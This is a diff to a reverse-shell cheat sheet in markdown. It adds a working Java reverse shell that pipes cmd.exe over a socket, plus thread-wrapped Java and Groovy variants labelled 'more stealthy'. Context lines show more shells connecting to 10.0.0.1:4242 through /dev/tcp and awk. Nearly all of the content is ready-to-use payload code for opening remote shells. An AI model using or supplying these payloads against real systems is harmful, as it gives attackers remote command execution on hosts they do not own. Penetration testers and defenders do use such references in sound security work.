@@ -18,10 +18,13 @@
     * [Powershell](#powershell)
     * [Awk](#awk)
     * [Java](#java)
+    * [Java Alternative 1](#java-alternative-1)
+    * [Java Alternative 2](#java-alternative-2)
     * [War](#war)
     * [Lua](#lua)
     * [NodeJS](#nodejs)
     * [Groovy](#groovy)
+    * [Groovy Alternative 1](#groovy-alternative-1)
 * [Meterpreter Shell](#meterpreter-shell)
     * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
     * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
@@ -190,6 +193,29 @@ awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& 
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
+
+```
+
+#### Java Alternative 1
+
+```java
+String host="127.0.0.1";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+```
+
+#### Java Alternative 2
+**NOTE**: This is more stealthy
+
+```java
+Thread thread = new Thread(){
+    public void run(){
+        // Reverse shell here
+    }
+}
+thread.start();
 ```
 
 ### War
@@ -250,11 +276,20 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 NOTE: Java reverse shell also work for Groovy
 
-```javascript
+```java
 String host="10.0.0.1";
 int port=4242;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+#### Groovy Alternative 1
+**NOTE**: This is more stealthy
+
+```java
+Thread.start {
+    // Reverse shell here
+}
 ```
 
 ## Meterpreter Shell
